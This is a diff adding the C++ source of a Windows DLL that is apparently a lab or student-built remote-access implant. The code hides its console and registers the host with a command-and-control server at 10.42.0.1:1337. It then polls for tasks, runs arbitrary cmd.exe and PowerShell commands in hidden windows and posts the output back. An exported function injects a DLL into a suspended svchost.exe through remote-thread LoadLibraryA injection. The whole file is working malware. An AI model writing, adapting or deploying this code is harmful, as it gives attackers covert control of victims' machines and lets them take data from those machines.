@@ -1,0 +1,503 @@
+#include "pch.h"
+#include <Windows.h>
+#include <tchar.h>
+#include <iostream>
+#include <cstring>
+#include <string>
+#include <sstream>
+#include <algorithm>
+#include <iterator>
+#include <vector>
+#include <WinHttp.h>
+#include <atlstr.h>
+#include <atlconv.h>
+#include <stdio.h>
+#include <Lmcons.h>
+
+#pragma warning(disable:4996)
+#pragma comment(lib, "winhttp.lib")
+
+//Converts utf8 to utf16
+std::wstring get_utf16(const std::string& str, int codepage)
+{
+    if (str.empty()) return std::wstring();
+    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
+    std::wstring res(sz, 0);
+    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
+    return res;
+
+}
+
+//Converts utf16 to utf8
+std::string get_utf8(const std::wstring& s)
+{
+    const int size = ::WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, 0, NULL);
+
+    std::vector<char> buf(size);
+    ::WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], size, 0, NULL);
+
+    return std::string(&buf[0]);
+}
+
+//Send GET request to the C2 server using the winhttp library
+std::string Get(std::string ip, unsigned int port, std::string uri)
+{
+    std::wstring sip = get_utf16(ip, CP_UTF8);
+    std::wstring suri = get_utf16(uri, CP_UTF8);
+
+    std::string response;
+
+    LPSTR pszOutBuffer;
+
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    BOOL  bResults = FALSE;
+
+    HINTERNET hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+
+    //Initialises use of winhttp function and returns session handle
+    hSession = WinHttpOpen(L"Get",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+
+    //Specifies intial target c2 server of http request and returns hinterent connection handle if winhttpopen was successful
+    if (hSession) {
+        hConnect = WinHttpConnect(hSession,
+            sip.c_str(),
+            port,
+            0);
+    }
+
+    //Creates http request handle with connection handle from winhttpconnect()
+    if (hConnect) {
+        hRequest = WinHttpOpenRequest(hConnect,
+            L"GET", suri.c_str(),
+            NULL,
+            WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            0);
+    }
+
+    //Sends the http request from winhttpopenrequest() to the c2 server
+    if (hRequest) {
+        bResults = WinHttpSendRequest(hRequest,
+            WINHTTP_NO_ADDITIONAL_HEADERS,
+            0,
+            WINHTTP_NO_REQUEST_DATA,
+            0,
+            0,
+            0);
+    }
+
+    //If the winhttpsendrequest() was successful the reponse is saved to bresults using winhttpreceiveresponse()
+    //This must be called to allow the code below to read the response body
+    if (bResults) {
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    }
+
+    //If a response was received, enter this function
+    if (bResults)
+    {
+        //do once and then while dwSize > 0
+        do
+        {
+            //This returns the amount of bytes in the response that are available for httpreaddata() can read
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}
+
+            pszOutBuffer = new char[dwSize + 1];
+            //If buffer is empty do nothing
+            if (!pszOutBuffer)
+            {
+                dwSize = 0;
+            }
+            else
+            {
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                //If the request is empty do nothing
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
+                //else add the response and buffer to reponse variable response 
+                else {
+                    response = response + std::string(pszOutBuffer);
+                    delete[] pszOutBuffer;
+                }
+            }
+        } while (dwSize > 0);
+    }
+
+    //Closes all handles
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    //Return the response
+    return response;
+}
+
+//Post data to the C2 server
+std::string Post(std::string ip, unsigned int port, std::string uri, std::string dat)
+{
+    //Initialise variable with data to post
+    LPSTR data = const_cast<char*>(dat.c_str());;
+    //Initialise variable with length of the data
+    DWORD data_len = strlen(data);
+
+    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
+    DWORD headersLength = -1;
+
+    //Converts the info from utf8 to utf16
+    std::wstring sip = get_utf16(ip, CP_UTF8);
+    std::wstring suri = get_utf16(uri, CP_UTF8);
+
+    std::string response;
+
+    LPSTR pszOutBuffer;
+
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    BOOL  bResults = FALSE;
+
+    HINTERNET hSession = NULL,
+        hConnect = NULL,
+        hRequest = NULL;
+
+    hSession = WinHttpOpen(L"Post",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+
+    if (hSession) {
+
+        hConnect = WinHttpConnect(hSession,
+            sip.c_str(),
+            port,
+            0);
+    }
+
+    if (hConnect) {
+
+        hRequest = WinHttpOpenRequest(hConnect,
+            L"POST", suri.c_str(),
+            NULL,
+            WINHTTP_NO_REFERER,
+            WINHTTP_DEFAULT_ACCEPT_TYPES,
+            0);
+    }
+
+    if (hRequest) {
+
+        bResults = WinHttpSendRequest(hRequest,
+            additionalHeaders,
+            headersLength,
+            (LPVOID)data,
+            data_len,
+            data_len,
+            0);
+    }
+
+    if (bResults) {
+
+        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    }
+
+    if (bResults)
+    {
+        do
+        {
+            dwSize = 0;
+            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}
+
+            pszOutBuffer = new char[dwSize + 1];
+            if (!pszOutBuffer)
+            {
+                dwSize = 0;
+            }
+            else
+            {
+                ZeroMemory(pszOutBuffer, dwSize + 1);
+
+                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
+                else {
+
+                    response = response + std::string(pszOutBuffer);
+                    delete[] pszOutBuffer;
+                }
+            }
+        } while (dwSize > 0);
+    }
+
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+
+    return response;
+
+}
+
+//Used to split responses from C2 server to get command
+std::vector <std::string> splits(std::string cmd, char delim = ' ')
+{
+    //Creates vector of type string
+    std::vector <std::string> result;
+
+    //Initialises stream with input and string
+    std::stringstream ss(cmd);
+    std::string token;
+
+    //Getline sends any text in the stream before ' '(space) to the vector results
+    while (std::getline(ss, token, delim)) {
+        result.push_back(token);
+    }
+    //returns output
+    return result;
+}
+
+//Used to spawn cmd or powershell and return the output
+CStringA shell(const wchar_t* cmd)
+{
+    CStringA result;
+    //Pointer variables that receive read and write handles for pipe
+    HANDLE hPipeRead, hPipeWrite;
+
+    //Security handles specifiying te returned handles of the pipe can be inherited by child
+    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    //If the pipe is not created stop
+    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
+        return result;
+
+    //Initialises startup info and assigns the handles
+    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.hStdOutput = hPipeWrite;
+    si.hStdError = hPipeWrite;
+    //Hides window
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = { 0 };
+
+    //Create new process cmd or powershell
+    BOOL fSuccess = CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    //If it failed the handles are closed
+    if (!fSuccess)
+    {
+        CloseHandle(hPipeWrite);
+        CloseHandle(hPipeRead);
+        return result;
+    }
+
+    //Reads the output of the command into the response vairable
+    bool bProcessEnded = false;
+    for (; !bProcessEnded;)
+    {
+        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
+
+        for (;;)
+        {
+            char buf[1024];
+            DWORD dwRead = 0;
+            DWORD dwAvail = 0;
+
+            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
+                break;
+
+            if (!dwAvail)
+                break;
+
+            if (!::ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
+                break;
+
+            buf[dwRead] = 0;
+            result += buf;
+        }
+    }
+
+    //Closes all handles
+    CloseHandle(hPipeWrite);
+    CloseHandle(hPipeRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return result;
+}
+
+int entry()
+{
+    //Hides console from showing
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    //Initialising variables that are passed to post and get
+    std::string name, ip, sPort;
+    std::string type = "w";
+    unsigned int port;
+
+    int n = 3000;
+
+    std::string hname = "";
+    std::string hnamecc = "cmd.exe /c hostname";
+    CA2W hnamec(hnamecc.c_str());
+    //runs command in shell to get hostname
+    hname = shell(hnamec);
+    //insitalises port and destination IP
+    port = 1337;
+    ip = "10.42.0.1";
+
+    //Sends post request and stores response in name
+    name = Post(ip, port, "/reg", "name=" + hname + "&type=" + type);
+
+    //Continue loop untill exit command has been recieved
+    while (true) {
+
+        //Sends GET request to C2 server looking for any tasks
+        std::string task = Get(ip, port, "/tasks/" + name);
+
+        //If the task is not empty enter if statment
+        if (task != "") {
+            //Split response to retreive command
+            std::vector <std::string> Task = splits(task);
+            std::string command = Task[0];
+            std::string res = "";
+
+            //If the command is sleep, change sleep time as specified
+            if (command == "sleep") {
+
+                int time = std::stoi(Task[1]);
+                n = time * 5000;
+            }
+            //If the command is quit, exit
+            else if (command == "quit") {
+
+                exit(0);
+            }
+            //If command is rename, change the name variable to the specified name
+            else if (command == "rename") {
+                name = Task[1];
+            }
+            //If the command is sheel, run cmd with the specified parameter(s)
+            else if (command == "shell") {
+
+                std::string scommand = "cmd.exe /c ";
+
+                for (int i = 1; i < Task.size(); i++) {
+                    scommand += Task[i] + " ";
+                }
+
+                CA2W shellcommand(scommand.c_str());
+
+                res = shell(shellcommand);
+            }
+            //If the command is powershell, run powershell with specified paramter(s)
+            else if (command == "powershell") {
+
+                std::string pscommand = "powershell.exe /c ";
+
+                for (int i = 1; i < Task.size(); i++) {
+                    pscommand += Task[i] + " ";
+                }
+
+                CA2W powershellcommand(pscommand.c_str());
+
+                res = shell(powershellcommand);
+
+            }
+
+            //Send response the the C2 server if the taks is completed
+            //For cmd and powershell commands, the response from the command is also sent
+            Post(ip, port, "/results/" + name, "result=" + res);
+        }
+        //Sleep for specified time and then check again for another task
+        Sleep(n);
+    }
+}
+
+
+
+extern "C" __declspec(dllexport) void InjectDLL() {
+
+    STARTUPINFO si = {};
+    PROCESS_INFORMATION pi = {};
+
+    //Getting the current username
+    TCHAR username[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserName((TCHAR*)username, &size);
+
+    // maximum length of the destination string
+    wchar_t dest1[150];
+    wchar_t dest2[150];
+
+    // maximum length of the source1 string
+    wchar_t src1[150];
+    wchar_t src2[150];
+
+    // initialize the destination1 string
+    wcscpy_s(dest1, L"C:\\Users\\");
+
+    // initialize the source string
+    wcscpy_s(src1, username);
+
+    //Joining dest1 and source1
+    wchar_t* path1 = wcscat(dest1, src1);
+
+    // initialize the destination2 string
+    wcscpy_s(dest2, path1);
+
+    // initialize the source2 string
+    wcscpy_s(src2, L"\\AppData\\Local\\Temp\\MessageDLL.dll");
+    
+    //Joining dest1 and source2
+    wchar_t* path2 = wcscat(dest2, src2);
+
+    //converts path2 to utf8 for use as a LPCSTR
+    std::string utf8String = get_utf8(path2);
+    LPCSTR dllPath = utf8String.c_str();
+    
+    //Intialising variable as target process
+    wchar_t svc[] = L"svchost.exe";
+
+    //Get handle for kernal32.dll
+    HMODULE k32 = GetModuleHandleA("kernel32.dll");
+    //Creates process(svchost.exe) in a suspended state
+    BOOL ok = CreateProcessW(NULL, svc, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    //Waits 2 seconds and if it was successful it enters the if statement
+    WaitForSingleObject(pi.hProcess, 2000);
+    if (ok) {
+        //Allocates a piece of memory within svchost the size of our dll being injected
+        LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        //Checks to make sure the memory is not empty
+        if (mem == NULL) {
+            MessageBoxA(0, "null", "1", 0);
+            exit(1);
+        }
+        //Writes the dll into the allocated memory
+        WriteProcessMemory(pi.hProcess, mem, (LPVOID)dllPath, strlen(dllPath), NULL);
+        //Creates a thread in the new process and points to the address space of kernal32.dll and loadlibrarya and passes the allocated memory as a parameter to be run
+        //In short, this runs the injected dll inside the new process svchost
+        HANDLE loadThread = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), mem, 0, 0);
+        WaitForSingleObject(loadThread, INFINITE);
+        //Releases the memory allocated and closes handles from created process
+        VirtualFreeEx(pi.hProcess, mem, strlen(dllPath) + 1, MEM_RELEASE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    entry();
+
+}
+
+
+//DLL Main function
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    
+    return TRUE;
+}
